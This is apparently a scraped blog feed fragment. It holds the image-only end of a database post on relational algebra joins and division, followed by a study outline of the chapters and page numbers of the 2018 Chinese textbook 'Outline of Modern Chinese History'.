<h5 id="左连接、右连接、外连接"><a href="#左连接、右连接、外连接" class="headerlink" title="左连接、右连接、外连接"></a>左连接、右连接、外连接</h5><p><img src="http://img.npfs06.top/20210323125151.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125201.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125210.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323125225.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="⑤-除（Division）"><a href="#⑤-除（Division）" class="headerlink" title="⑤ 除（Division）"></a>⑤ 除（Division）</h4><p><img src="http://img.npfs06.top/20210323125236.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125246.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125300.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125310.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="⑥-综合举例"><a href="#⑥-综合举例" class="headerlink" title="⑥ 综合举例"></a>⑥ 综合举例</h4><p><img src="http://img.npfs06.top/20210323125319.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125329.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125341.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="http://img.npfs06.top/20210323125350.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="http://img.npfs06.top/20210323125402.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125410.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210323125422.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210323125437.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>share</category>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>中国近代史纲要（2018）详细目录</title>
    <url>/2021/05/31/%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%EF%BC%882018%EF%BC%89%E8%AF%A6%E7%BB%86%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<p>中国近代史纲要（2018）详细目录<a id="more"></a></p>
<p><strong>一、鸦片战争前的中国与世界</strong><br>1.中国灿烂的古代文明 7<br>2.中国封建社会由昌盛到衰落 8<br>3.世界资本主义的发展与殖民扩张 9 </p>
<p><strong>二、外国资本主义入侵与近代中国社会的半殖民地半封建性质</strong><br>1.鸦片战争:中国近代史的起点 10<br>2.中国社会的半殖民地半封建性质 12<br>       为什么说独立的中国逐渐变成了半殖民地的中国, 12<br>       为什么说封建的中国逐渐变成了半封建的中国, 13<br>       中国半殖民地半封建社会的基本特征 13-14<br>3.社会阶级关系的变动15<br>       地主阶级 15<br>       农民阶级 15<br>       工人阶级 15<br>       资产阶级:官僚买办资本家;民族资本家 16<br><strong>三、近代中国的主要矛盾和历史任务</strong><br>1.两对主要矛盾及其关系 16<br>       近代中国半殖民地半封建社会的矛盾 16<br>       占支配地位的两对主要矛盾:帝国主义和中华民族的矛盾; 17<br>       封建主义和人民大众的矛盾  17<br>2.两大历史任务及其关系 18<br>       两大历史任务:争取民族独立、人民解放和实现国家富强、人民富裕 18<br>       两大历史任务的关系 18 </p>
<h1 id="第一章反对外国侵略的斗争"><a href="#第一章反对外国侵略的斗争" class="headerlink" title="第一章反对外国侵略的斗争"></a>第一章反对外国侵略的斗争</h1><h2 id="第一节资本-帝国主义对中国的侵略"><a href="#第一节资本-帝国主义对中国的侵略" class="headerlink" title="第一节资本-帝国主义对中国的侵略"></a>第一节资本-帝国主义对中国的侵略</h2><p> <strong>一、军事侵略21</strong><br>1.发动侵略战争屠杀中国人民 21<br>2.侵占中国领土划分势力范围 21<br>3.勒索赔款抢掠财富 23<br><strong>二、政治控制23</strong><br>1.控制中国的内政、外交 24<br>2.镇压中国人民的反抗25<br>3.扶植、收买代理人26<br><strong>三、经济掠夺26</strong><br>1.控制中国的通商口岸 26<br>2.剥夺中国的关税自主权 27<br>3.实行商品倾销和资本输出 27<br>4.操纵中国的经济命脉 28<br><strong>四、文化渗透30</strong><br>1.披着宗教外衣进行侵略活动 30<br>2.为侵略中国制造舆论 31</p>
<h2 id="第二节抵御外国武装侵略争取民族独立的斗争32"><a href="#第二节抵御外国武装侵略争取民族独立的斗争32" class="headerlink" title="第二节抵御外国武装侵略争取民族独立的斗争32"></a>第二节抵御外国武装侵略争取民族独立的斗争32</h2><p><strong>一、反抗外来侵略的斗争历程32</strong><br>1.人民群众的反侵略斗争 32<br>2.爱国官兵的反侵略斗争 33<br><strong>二、粉碎瓜分中国的图谋 34</strong><br>1.边疆危机和瓜分危机 34<br>2.义和团运动与列强瓜分中国图谋的破产 35<br>        帝国主义未能实现瓜分中国图谋的原因 35<br>        义和团运动的局限性、积极意义 36</p>
<h2 id="第三节反侵略张正德失败与民族意识的觉醒37"><a href="#第三节反侵略张正德失败与民族意识的觉醒37" class="headerlink" title="第三节反侵略张正德失败与民族意识的觉醒37"></a>第三节反侵略张正德失败与民族意识的觉醒37</h2><p><strong>一、反侵略战争的失败及其原因37</strong><br>1.社会制度的腐败 37<br>2.经济技术的落后 38<br><strong>二、民族意识的觉醒39</strong><br>1.“师夷长技以制夷”的主张和早期的维信思想39<br>2救亡图存和振兴中华 40</p>
<h1 id="第二章对国家出路的早期探索43"><a href="#第二章对国家出路的早期探索43" class="headerlink" title="第二章对国家出路的早期探索43"></a>第二章对国家出路的早期探索43</h1><p> 农民阶级背景;战争性质<br>        农民阶级——太平天国农民战争<br>        地主阶级洋务派——洋务运动<br>        资产阶级维新派——维新运动<br>        资产阶级革命派——辛亥革命</p>
<h2 id="第一节农民群众斗争风暴的起落-43"><a href="#第一节农民群众斗争风暴的起落-43" class="headerlink" title="第一节农民群众斗争风暴的起落 43"></a>第一节农民群众斗争风暴的起落 43</h2><p><strong>一、太平天国农民战争 43</strong><br>1.金田起义和天平天国的建立 43<br>2.《天朝田亩制度》和《资政新篇》 44<br>3.从天京事变到太平天国的灭亡 45<br><strong>二、农民斗争的意义和局限性 46</strong><br>1.太平天国起义的历史意义 46<br>2.天平天国起义失败的原因和教训 47 </p>
<h2 id="第二节洋务运动的兴衰-48（19世纪60年代初—90年代末-）"><a href="#第二节洋务运动的兴衰-48（19世纪60年代初—90年代末-）" class="headerlink" title="第二节洋务运动的兴衰 48（19世纪60年代初—90年代末 ）"></a>第二节洋务运动的兴衰 48（19世纪60年代初—90年代末 ）</h2><p> <strong>一、洋务事业的兴办 48（中体西用）</strong><br>1.兴办近代企业 49（军用;民用工业）<br>2.建立新式海陆军 50<br>3.创办新式学堂派遣留学生 50<br><strong>二、洋务运动的历史作用及其失败50</strong><br>1.洋务运动的历史作用 50<br>2.洋务运动失败的原因 51</p>
<h2 id="第三节维新运动的兴起和夭折-52"><a href="#第三节维新运动的兴起和夭折-52" class="headerlink" title="第三节维新运动的兴起和夭折 52"></a>第三节维新运动的兴起和夭折 52</h2><p> <strong>一、戊戌维新运动 52</strong><br>1.维新派倡导救亡和变法的活动 52（公车上书;强学会 保国会;《时务报》 ）<br>2.维新派与守旧派的论战 53<br>3.昙花一现的百日维新 54<br> <strong>二、戊戌维新运动的意义和教训 56</strong><br>1.戊戌维新运动的意义 56<br>2.戊戌维新运动失败的原因和教训 57 </p>
<h1 id="第三章辛亥革命与君主专制制度的终结60"><a href="#第三章辛亥革命与君主专制制度的终结60" class="headerlink" title="第三章辛亥革命与君主专制制度的终结60"></a>第三章辛亥革命与君主专制制度的终结60</h1><h2 id="第一节举起近代民族民主革命的旗帜60"><a href="#第一节举起近代民族民主革命的旗帜60" class="headerlink" title="第一节举起近代民族民主革命的旗帜60"></a>第一节举起近代民族民主革命的旗帜60</h2><p> <strong>一、辛亥革命爆发的历史条件60</strong><br>1.民族危机加深社会矛盾激化 60<br>2.清末“新政”及其破产 61 (1904.04新政;预备立宪;1908《钦定宪法大纲》 )<br>3.资产阶级革命派的阶级基础和骨干力量 62<br><strong>二、资产阶级革命派的活动63</strong><br>1.孙中山与资产阶级民主革命的开始 63兴中会<br>2.资产阶级革命派的宣传与组织工作63<br>章炳麟 陈天华 邹容;1905.08.20同盟会<br><strong>三、三民主义学说和资产阶级共和国方案64 (1905.11《民报》)</strong><br>1.民族主义 64<br>2.民权主义 65<br>3.民生主义 65<br><strong>四、关于革命与改良的辩论 65</strong><br>1.要不要以革命手段推翻清王朝 65<br>2.要不要推翻帝制实行共和 67<br>3.要不要社会革命 67<br>        论战意义;资产阶级革命派在思想理论方面的弱点</p>
<h2 id="第二节辛亥革命与建立民国-68"><a href="#第二节辛亥革命与建立民国-68" class="headerlink" title="第二节辛亥革命与建立民国 68"></a>第二节辛亥革命与建立民国 68</h2><p><strong>一、封建帝制的覆灭 68</strong><br>1.武装起义与保路风潮 68（1911.04.27广州黄花岗起义 ）<br>2.武昌首义与各地响应 68（1911.10.10;共进会 文学社;湖北军政府;1912.02.12清帝退位;<br>资产阶级革命派软弱性）</p>
<p><strong>二、中华民国的建立 69</strong><br>1.中华民国临时政府宣告成立 69（1912.01.01 ）<br>2.中华民国临时约法 70（1912.03 ）<br>3.辛亥革命的历史意义 71 </p>
<h2 id="第三节辛亥革命的失败72"><a href="#第三节辛亥革命的失败72" class="headerlink" title="第三节辛亥革命的失败72"></a>第三节辛亥革命的失败72</h2><p><strong>一、封建军阀专制统治的形成72</strong><br>1.袁世凯窃国辛亥革命流产 72<br>2.封建军阀的专制统治73（1913.03宋教仁案;镇压“二次革命”;解散国民党;1915.05“二十<br>一条”;张勋复辟;尊孔复古 ）<br><strong>二、旧民主主义革命的终结 76</strong><br>1.挽救共和的努力及其受挫 76（“二次革命”;护国运动;护法运动 ）<br>2.辛亥革命失败的原因和教训 77</p>
<h1 id="中编-从五四运动到新中国成立1919-1949"><a href="#中编-从五四运动到新中国成立1919-1949" class="headerlink" title="中编 从五四运动到新中国成立1919-1949"></a>中编 从五四运动到新中国成立1919-1949</h1><h1 id="综述翻天覆地的三十年83"><a href="#综述翻天覆地的三十年83" class="headerlink" title="综述翻天覆地的三十年83"></a>综述翻天覆地的三十年83</h1><p> <strong>一、中国所处的时代和国际环境83</strong><br>1.第一次世界大战和俄国十月革命后的世界 83<br>2.世界反法西斯战争及其胜利 84<br> 3.反法西斯战争胜利后国际格局的深刻变化 85<br><strong>二、“三座大山”的重压(外国帝国主义、本国封建主义、官僚资本主义) 86</strong><br>1.外国垄断资本主义在中国的扩张 87<br>2.占优势地位的中国封建经济 89<br>3.官僚资本的急剧膨胀 90<br>4.民族资本主义经济的状况及其艰难处境 92<br><strong>三、两个中国之力量 95</strong><br>1.三中政治力量三种建国方案 95<br>2.两种基本选择两个中国之命运 96 </p>
<h1 id="第四章开天辟地的大事变99"><a href="#第四章开天辟地的大事变99" class="headerlink" title="第四章开天辟地的大事变99"></a>第四章开天辟地的大事变99</h1><h2 id="第一节新文化运动和五四运动-99"><a href="#第一节新文化运动和五四运动-99" class="headerlink" title="第一节新文化运动和五四运动 99"></a>第一节新文化运动和五四运动 99</h2><p><strong>一、新文化运动与思想解放的潮流 99</strong><br>1.新文化运动的兴起 1915.09《新青年》99<br>2.新文化运动的基本口号 民主和科学100<br>3.反封建的思想解放运动 101<br>4.五四以前新文化运动的局限 102<br><strong>二、十月革命与马克思主义在中国的传播李大钊100</strong><br><strong>三、五四运动:新民主主义革命的开端 106</strong><br>1.五四运动的爆发 1919.05.04;工人阶级登上历史舞台 106<br>2.五四运动的历史特点为中国共产党的成立作思想和干部上的准备107 </p>
<h2 id="第二节马克思主义进一步传播与中国共产党的诞生-109"><a href="#第二节马克思主义进一步传播与中国共产党的诞生-109" class="headerlink" title="第二节马克思主义进一步传播与中国共产党的诞生 109"></a>第二节马克思主义进一步传播与中国共产党的诞生 109</h2><p><strong>一、中国早期马克思主义思想运动 109</strong><br> 1.早期马克思主义者的队伍 109<br>2.早期马克思主义思想运动的特点110<br>3.新文化运动的发展 112<br><strong>二、马克思主义与中国工人运动的结合 113</strong><br>1.中国共产党的早期组织<br>1920.11《共产党》113<br>2.中国共产党早期组织的活动 114<br><strong>三、中国共产党的创建及其意义 117</strong><br>1.中国共产党第一次全国代表大会 1921.07.23;确定党的名称 纲领 领导机构117<br>2.中国共产党成立的历史特点和意义 119 </p>
<h2 id="第三节中国革命的新局面-121"><a href="#第三节中国革命的新局面-121" class="headerlink" title="第三节中国革命的新局面 121"></a>第三节中国革命的新局面 121</h2><p><strong>一、制定革命纲领发动工农运动 121</strong><br>1.制定反帝反封建的民主革命纲领 121<br>2.发动工农群众开展革命斗争1922.01—1923.02京汉铁路大罢工 122<br><strong>二、实行国共合作掀起大革命高潮 122</strong><br>1.国共合作的形成 122<br>        二七惨案;中共二大;1924.01国民党一大:新三民主义<br>2.大革命的准备与进行 124<br>        1925—1927;五卅运动;打倒列强除军阀<br>3.大革命中的中国共产党 125<br>4.大革命的意义、失败原因和教训 126 </p>
<h1 id="第五章中国革命名的新道路-129"><a href="#第五章中国革命名的新道路-129" class="headerlink" title="第五章中国革命名的新道路 129"></a>第五章中国革命名的新道路 129</h1><h2 id="第一节对革命新道路的艰苦探索-129"><a href="#第一节对革命新道路的艰苦探索-129" class="headerlink" title="第一节对革命新道路的艰苦探索 129"></a>第一节对革命新道路的艰苦探索 129</h2><p><strong>一、国民党在全国统治的建立 129</strong><br>宁汉合流;东北易帜;一党专政的军事独裁统治<br><strong>二、土地革命战争的兴起 132</strong><br>1.大革命失败后的艰难环境 132<br>2.开展武装反抗国民党反动统治的斗争 133<br>        1927南昌起义;八七会议;秋收起义;广州起义<br><strong>三、走农村包围城市、武装夺取政权的道路 134</strong><br>1.对中国革命新道路的探索 134<br>2.反“围剿”战争与土地革命 137<br>        土地革命纲领和路线;左翼文化运动 </p>
<h2 id="第二节中国革命在探索中曲折前进-139"><a href="#第二节中国革命在探索中曲折前进-139" class="headerlink" title="第二节中国革命在探索中曲折前进 139"></a>第二节中国革命在探索中曲折前进 139</h2><p><strong>一、土地革命战争的发展及其挫折 139</strong><br>1.农村革命根据地的建设 139<br>        1931.11中华苏维埃共和国临时中央政府<br>2.土地革命战争的严重受挫 140<br>        左倾错误:原因;危害<br><strong>二、中国革命的历史性转折 142</strong><br>1.遵义会议<br>        1935.01.15—17142<br>2.红军长征的胜利 (1936.10会宁会师)  144<br> <strong>三、总结历史经验迎接全民族抗日战争 145</strong></p>
<h1 id="第六章-中华民族的抗日战争-148"><a href="#第六章-中华民族的抗日战争-148" class="headerlink" title="第六章 中华民族的抗日战争 148"></a>第六章 中华民族的抗日战争 148</h1><h2 id="第一节日本发动灭亡中国的侵略战争-148"><a href="#第一节日本发动灭亡中国的侵略战争-148" class="headerlink" title="第一节日本发动灭亡中国的侵略战争 148"></a>第一节日本发动灭亡中国的侵略战争 148</h2><p><strong>一、日本灭亡中国的计划及其实施 148</strong><br>1.从九一八事变大盘华北事变 148<br>2.卢沟桥事变与日本的全面侵华战争 149<br><strong>二、残暴的殖民统治和中华民族的深重灾难 150</strong><br>1.日本在其占领区的残暴统治 150<br>2.侵华日军的严重罪行 151 </p>
<h2 id="第二节从局部抗战到全国性抗战-152"><a href="#第二节从局部抗战到全国性抗战-152" class="headerlink" title="第二节从局部抗战到全国性抗战 152"></a>第二节从局部抗战到全国性抗战 152</h2><p><strong>一、中国共产党举起武装抗日的旗帜 152</strong><br><strong>二、抗日救亡运动和共产党人与部分国民党人合作抗日 153</strong><br><strong>三、停止内战一致对外 154</strong><br>1.一二九运动与中共的抗日民族统一战线新政策 154<br>2.西安事变及其和平解决 155<br><strong>四、全民族抗战开始 156</strong><br>1.国共合作共赴国难 156<br>2.全民族同仇敌忾奋起抗战 157 </p>
<h2 id="第三节-国民党与抗日的正面战场158"><a href="#第三节-国民党与抗日的正面战场158" class="headerlink" title="第三节 国民党与抗日的正面战场158"></a>第三节 国民党与抗日的正面战场158</h2><p><strong>一、 战略防御阶段的正面战场158</strong><br><strong>二、 战略相持阶段的正面战场159</strong> </p>
<h2 id="第四节中国共产党成为抗日战争的中流砥柱-161"><a href="#第四节中国共产党成为抗日战争的中流砥柱-161" class="headerlink" title="第四节中国共产党成为抗日战争的中流砥柱 161"></a>第四节中国共产党成为抗日战争的中流砥柱 161</h2><p> <strong>一、全面抗战的路线和持久战的方针 161</strong><br>1.实行全面的全民族抗战的路线 161<br>2.采取持久战的战略方针 161<br><strong>二、敌后战场的开辟与游击战争的发展 162</strong><br>1.敌后战场的开辟和发展 162<br>2.游击战这个的战略地位和作用 163<br><strong>三、坚持抗战、团结、进步的方针 164</strong><br>1.统一战线中的独立自主原则 164<br>2.坚持抗战、团结、进步反对妥协、分裂、倒退 165<br>3.巩固抗日民族统一战线的策略总方针 166<br><strong>四、抗日民主根据地的建设 166</strong><br>1.三三制的民主政权建设 167<br>2.减租减息发展生产 167<br>3文化建设与干部教育 168<br><strong>五、推进大后方的抗日民主运动和进步文化工作 168</strong><br>1.抗日民主运动的开展 168<br>2.抗战文化工作的开展 169<br><strong>六、中国共产党的自身建设170</strong><br>1.马克思主义中国化命题的提出 170<br>2.新民主主义理论的系统阐明 171<br>3.整风运动和实事求是思想路线在全党的确立 172 </p>
<h2 id="第五节-抗日战争的胜利及意义-175"><a href="#第五节-抗日战争的胜利及意义-175" class="headerlink" title="第五节 抗日战争的胜利及意义 175"></a>第五节 抗日战争的胜利及意义 175</h2><p><strong>一、抗日战争的胜利 175</strong><br><strong>二、中国人民抗日战争在世界反法西斯战争中的地位 176</strong><br>1.世界反打西斯战争的东方主战场 176<br>2.世界反法西斯力量对中国的援助 177<br><strong>三、抗日战争胜利的意义、原因和基本经验 177</strong><br>1.抗日战争胜利的原因177<br>2.抗日战争胜利的意义179 </p>
<h1 id="第七章-为新中国而奋斗"><a href="#第七章-为新中国而奋斗" class="headerlink" title="第七章 为新中国而奋斗"></a>第七章 为新中国而奋斗</h1><h2 id="第一节-从争取和平民主到进行自卫战争-181"><a href="#第一节-从争取和平民主到进行自卫战争-181" class="headerlink" title="第一节 从争取和平民主到进行自卫战争 181"></a>第一节 从争取和平民主到进行自卫战争 181</h2><p><strong>一、中国共产党争取和平民主的斗争 181</strong><br>1.战后国际国内形势政策 181<br>2中国共产党争取和平民主的方针 183<br>3重庆谈判和政治协商会议 183<br>4维护和破坏政协协商会议的较量 184 </p>
<p><strong>二、国民党发动内战和解放区军民的自卫战争 184</strong><br>1.全面内战爆发 185<br>2.以革命战争反对革命战争 186<br>3.以自卫战争粉碎国民党的军事进攻 186 </p>
<h2 id="第二节-国民党政府处在全民的包围中"><a href="#第二节-国民党政府处在全民的包围中" class="headerlink" title="第二节 国民党政府处在全民的包围中"></a>第二节 国民党政府处在全民的包围中</h2><p><strong>一. 全国解放战争的胜利发展 187</strong><br>1.人民解放军转入战略进攻 187<br>2.提出“打倒蒋介石解放全中国”的口号 188<br><strong>二、土地改革与农民的广泛发动189</strong><br>1.从《五四指示》到《中国土地法大纲》 189<br>2.土地改革运动的热潮 189<br><strong>三、第二条战线的形成和发展 190</strong><br>1.国民党统治区的政治经济危机 190<br>2.学生运动的高涨 191<br>3.人民民主运动的发展 192 </p>
<h2 id="第三节-中国共产党与各民主党派的合作-194"><a href="#第三节-中国共产党与各民主党派的合作-194" class="headerlink" title="第三节 中国共产党与各民主党派的合作 194"></a>第三节 中国共产党与各民主党派的合作 194</h2><p><strong>一、 各民主党派的发展历史 194</strong><br><strong>二、中国共产党与各民主党派的团结合作 196</strong><br><strong>三、第三条道路的幻灭 197</strong><br>1.第三条道路的主张 197<br>2.国民党当局对民主党派的迫害 198<br>3.民主党派历史上的转折点 198<br><strong>四、中国共产党领导的多党合作、政治协商格局的形成199</strong> </p>
<h2 id="第四节创建人民民主专政的新中国-186"><a href="#第四节创建人民民主专政的新中国-186" class="headerlink" title="第四节创建人民民主专政的新中国 186"></a>第四节创建人民民主专政的新中国 186</h2><p>   <strong>一、南京国民党政权的覆灭200</strong><br>    1.辽沈、淮南、平津三大战役 200<br>    2.人民解放军向全国进军 201<br>   <strong>二、人民政协与《共同纲领》202</strong><br>    1.为新中国绘制蓝图 202<br>     2.人民政协会议的召开与《共同纲领》的制定 204<br>   <strong>三、中国革命胜利的原因和基本经验205</strong><br>    1.中国革命胜利的原因 205<br>    2.中国革命胜利的基本经验 207 </p>
<h1 id="下编-从新中国成立到社会主义现代化建设新时期-1949-2009"><a href="#下编-从新中国成立到社会主义现代化建设新时期-1949-2009" class="headerlink" title="下编 从新中国成立到社会主义现代化建设新时期(1949-2009)"></a>下编 从新中国成立到社会主义现代化建设新时期(1949-2009)</h1><h1 id="综述-辉煌的历史征程-199"><a href="#综述-辉煌的历史征程-199" class="headerlink" title="综述 辉煌的历史征程 199"></a>综述 辉煌的历史征程 199</h1><p><strong>一、中华人民共和国的成立和中国进入社会主义初级阶段213</strong><br>        从新民主主义向社会主义的过渡 214<br>        中国进入社会主义初级阶段216     </p>
<p><strong>二、新中国发展的两个历史时期及其相互关系217</strong><br><strong>三、开创和发展中国特色社会主义 218</strong><br><strong>四、中国特色社会主义进入新时代 220</strong> </p>
<h1 id="第八章-社会主义基本制度在中国的建立"><a href="#第八章-社会主义基本制度在中国的建立" class="headerlink" title="第八章 社会主义基本制度在中国的建立"></a>第八章 社会主义基本制度在中国的建立</h1><h2 id="第一节-从新民主主义向社会主义过渡的开始-223"><a href="#第一节-从新民主主义向社会主义过渡的开始-223" class="headerlink" title="第一节 从新民主主义向社会主义过渡的开始 223"></a>第一节 从新民主主义向社会主义过渡的开始 223</h2><p>  <strong>一、完成民主革命遗留任务和恢复国民经济 223</strong><br>  <strong>二、开始向社会主义过渡 227</strong> </p>
<h2 id="第二节-社会主义道路-历史和人民的选择-228"><a href="#第二节-社会主义道路-历史和人民的选择-228" class="headerlink" title="第二节 社会主义道路:历史和人民的选择 228"></a>第二节 社会主义道路:历史和人民的选择 228</h2><p><strong>一、工业化的任务和发展道路 228</strong><br>1.提出国家工业化的任务 228<br>2.选择社会主义工业化的道路 229<br><strong>二、过渡时期总路线反映了历史的必然性 230</strong><br>1.过渡时期总路线的提出 230<br>2.实行社会主义改造的国内外条件232 </p>
<h2 id="第三节-有中国特点的向社会主义过渡道路"><a href="#第三节-有中国特点的向社会主义过渡道路" class="headerlink" title="第三节 有中国特点的向社会主义过渡道路"></a>第三节 有中国特点的向社会主义过渡道路</h2><p><strong>一、社会主义工业化与社会主义改造同时并举 236</strong><br><strong>二、农业合作化运动的发展 237</strong><br> 1.农业合作化任务的提出 237<br> 2.农业合作化的基本方针 238<br> 3.农业合作化的发展和基本完成 239<br> 4.手工业合作化的实现 240<br><strong>三、对资本主义工商业赎买政策的实施 241</strong><br>  1.经过国家资本主义走向社会主义 241<br>  2.和平赎买政策的实现 242<br><strong>四、社会主义基本制度在中国的全面确立243</strong><br>  1.人民民主政治建设的稳步推进 243<br>  2.社会主义改造的基本完成 245<br>  3.在社会主义条件下推进工业化、现代化 247 </p>
<h1 id="第九章-社会主义建设在探索中曲折发展"><a href="#第九章-社会主义建设在探索中曲折发展" class="headerlink" title="第九章 社会主义建设在探索中曲折发展"></a>第九章 社会主义建设在探索中曲折发展</h1><h2 id="第一节-良好的开局-249"><a href="#第一节-良好的开局-249" class="headerlink" title="第一节 良好的开局 249"></a>第一节 良好的开局 249</h2><p><strong>一、全面建设社会主义的开端 249</strong><br> 1.提出马克思主义同中国实际的“第二次结合” 249<br> 2.在社会主义制度下保护和发展生产力 250<br><strong>二、早期探索的积极进展 251</strong><br>1.《论十大关系》的发表 251<br>2.中共八大路线的制定 253<br>3.《关于正确处理人民内部矛盾的问题》的发表254<br>4.整风运动和反右派斗争 255 </p>
<h2 id="第二节-探索中的严重曲折"><a href="#第二节-探索中的严重曲折" class="headerlink" title="第二节 探索中的严重曲折"></a>第二节 探索中的严重曲折</h2><p><strong>一、“大跃进”及其纠正 257</strong><br>1.“大跃进”和人民公社化运动的发展 257<br>2.初步纠正“左”倾错误的努力 259<br>3.庐山会议与“左”进程的中断 259<br>4.国民经济的调整 260<br>5.“七千人大会”的召开与调整任务的基本完成 261<br><strong>二、“文化大革命”及其结束</strong><br>1.“文化大革命”的发动 262<br>2.全名内乱的形成 264<br>3.粉碎林彪反革命集团 265<br>4.挫败“四人帮” “组阁”图谋 266<br>5.1975年整顿和“文化大革命”的结束 267<br><strong>三、严重的“曲折”深刻的教训 268</strong><br>1.错误的性质  268<br>2.犯错误的原因  269<br>3.对错误进行科学分析 271 </p>
<h2 id="第三节-建设的成就、探索的成果-256"><a href="#第三节-建设的成就、探索的成果-256" class="headerlink" title="第三节 建设的成就、探索的成果 256"></a>第三节 建设的成就、探索的成果 256</h2><p><strong>一、独立的、比较完整的工业体系和国民经济体系的基本建立273</strong></p>
<p>1.较快的发展速度  273<br>2.从根本上解决“从无到有”的问题 273 </p>
<p>**二、人民生活水平的提高与文化、医疗、科技事业的发展275 **</p>
<p>1.保障人民的基本生活需要 275<br>2.提高人民的文化素质和健康水平 275<br>3.取得一批重要的科技成果 276 </p>
<p>**三、国际地位的提高与国际环境的改善 277 **</p>
<p><strong>四、探索中形成的建设社会主义的若干重要原则 279</strong></p>
<h1 id="第十章-改革开放与现代化建设新时期"><a href="#第十章-改革开放与现代化建设新时期" class="headerlink" title="第十章 改革开放与现代化建设新时期"></a>第十章 改革开放与现代化建设新时期</h1><h2 id="第一节-历史性的伟大转折和改革开放的起步-283"><a href="#第一节-历史性的伟大转折和改革开放的起步-283" class="headerlink" title="第一节 历史性的伟大转折和改革开放的起步 283"></a>第一节 历史性的伟大转折和改革开放的起步 283</h2><p>**一、伟大的历史性转折 283 **</p>
<p>1.在徘徊中前进和关于真理标准问题的讨论 283<br>2.中共十一届三中全会的伟大转折 284 </p>
<p>**二、改革开放的起步 285 **</p>
<p>1.拨乱反正的推进和国民经济的调整 285<br>2.农村改革的突破性进展 286<br>3.对外政策的调整 288 </p>
<p>**三、拨乱反正任务的胜利完成 288 **</p>
<p>1.阐明必须坚持四项基本原则 288<br>2.全面总结新中国的历史 科学评价毛泽东和毛泽东思想 289 </p>
<h2 id="第二节-改革开放和现代化建设新局面的展开-290"><a href="#第二节-改革开放和现代化建设新局面的展开-290" class="headerlink" title="第二节 改革开放和现代化建设新局面的展开 290"></a>第二节 改革开放和现代化建设新局面的展开 290</h2><p><strong>一、改革开放的全面展开 290</strong></p>
<p>1.社会主义现代化建设宏伟纲领的制定 290<br>2.改革重点从农村转向城市 292<br>3.多层次对外开放格局的形成 292<br>4.整党和社会主义精神文明建设 293 </p>
<p>**二、改革开放和现代化建设的深入推进 294 **</p>
<p>1.社会主义初级阶段理论和党的基本路线的提出 294<br>2.“三步走”发展战略的制定和实施 295<br>3.政治体制改革基本思路的提出 295 </p>
<p>**三、中国特色社会主义事业的继续推进 296 **</p>
